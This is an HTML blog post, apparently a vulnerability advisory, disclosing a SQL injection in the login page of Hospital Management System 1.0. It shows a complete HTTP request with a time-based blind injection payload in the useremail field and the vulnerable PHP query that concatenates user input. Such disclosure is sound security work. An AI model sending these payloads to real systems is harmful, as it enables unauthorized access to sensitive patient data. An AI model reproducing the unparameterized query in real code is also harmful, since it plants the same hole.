@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Hospital Management System 1.0 SQL Injection</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hospital Management System 1.0 SQL Injection | Hacker-Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Hospital Management System 1.0 SQL Injection" />
+<meta name="author" content="SoSPiro" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Exploit Title: Hospital Management System - SQL Injection Google Dork: N/A Application: Hospital Management System Date: 26.02.2024 Bugs: SQL Injection Exploit Author: SoSPiro Vendor Homepage: https://www.sourcecodester.com/ Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html Version: 1.0 Tested on: Windows 10 64 bit Wampserver CVE : N/A" />
+<meta property="og:description" content="Exploit Title: Hospital Management System - SQL Injection Google Dork: N/A Application: Hospital Management System Date: 26.02.2024 Bugs: SQL Injection Exploit Author: SoSPiro Vendor Homepage: https://www.sourcecodester.com/ Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html Version: 1.0 Tested on: Windows 10 64 bit Wampserver CVE : N/A" />
+<link rel="canonical" href="http://localhost:8000/Hospital-Management-System-1.0-SQL-Injection" />
+<meta property="og:url" content="http://localhost:8000/Hospital-Management-System-1.0-SQL-Injection" />
+<meta property="og:site_name" content="Hacker-Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-02-26T00:00:00+04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hospital Management System 1.0 SQL Injection" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"SoSPiro","url":"http://0.0.0.0:8000/hacker-blog-master"},"dateModified":"2024-02-26T00:00:00+04:00","datePublished":"2024-02-26T00:00:00+04:00","description":"Exploit Title: Hospital Management System - SQL Injection Google Dork: N/A Application: Hospital Management System Date: 26.02.2024 Bugs: SQL Injection Exploit Author: SoSPiro Vendor Homepage: https://www.sourcecodester.com/ Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html Version: 1.0 Tested on: Windows 10 64 bit Wampserver CVE : N/A","headline":"Hospital Management System 1.0 SQL Injection","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Hospital-Management-System-1.0-SQL-Injection"},"url":"http://localhost:8000/Hospital-Management-System-1.0-SQL-Injection"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>sospiro@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Hospital Management System 1.0 SQL Injection</h2>
+  <time datetime="2024-02-26T00:00:00+04:00" class="by-line">26 Feb 2024</time>
+  <ul>
+  <li>Exploit Title: Hospital Management System - SQL Injection</li>
+  <li>Google Dork: N/A</li>
+  <li>Application: Hospital Management System</li>
+  <li>Date: 26.02.2024</li>
+  <li>Bugs: SQL Injection</li>
+  <li>Exploit Author: SoSPiro</li>
+  <li>Vendor Homepage: https://www.sourcecodester.com/</li>
+  <li>Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html</li>
+  <li>Version: 1.0</li>
+  <li>Tested on: Windows 10 64 bit Wampserver</li>
+  <li>CVE : N/A</li>
+</ul>
+
+<h3 id="vulnerability-description">Vulnerability Description:</h3>
+
+<p>A security vulnerability has been identified in this web application due to the direct inclusion of user-input data into SQL queries, rendering it susceptible to SQL Injection attacks. This vulnerability may enable malicious actors to gain unauthorized access to sensitive information.</p>
+
+<h3 id="proof-of-concept-poc">Proof of Concept (PoC):</h3>
+
+<p>Below is an example of an attack that a malicious actor could execute to exploit this vulnerability.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /Vaidya%20Mitra/vm/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/Vaidya%20Mitra/vm/login.php
+Cookie: _ga=GA1.1.2080672900.1708952048; _gid=GA1.1.1833914840.1708952048; PHPSESSID=18a16tga7k2glh7
+
+useremail=test@123.asd'%2b(select*from(select(sleep(5)))a)%2b'&amp;userpassword=test
+</code></pre></div></div>
+
+<p>In this example, the payload appended to the useremail parameter aims to execute a sleep function, intentionally delaying the server’s response time. Real-world attacks could involve more malicious operations.</p>
+
+<p><a href="https://i.imgur.com/LxENLBz.png">Request - Response foto</a></p>
+
+<h3 id="vulnerable-code-section">Vulnerable code section:</h3>
+
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Vaidya%20Mitra/vm/login.php
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'useremail'</span><span class="p">];</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'userpassword'</span><span class="p">];</span>
+
+<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$database</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"select * from webuser where email='</span><span class="nv">$email</span><span class="s2">'"</span><span class="p">);</span>
+</code></pre></div></div>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="#">
+    <span>
+        <b>SoSPiro</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
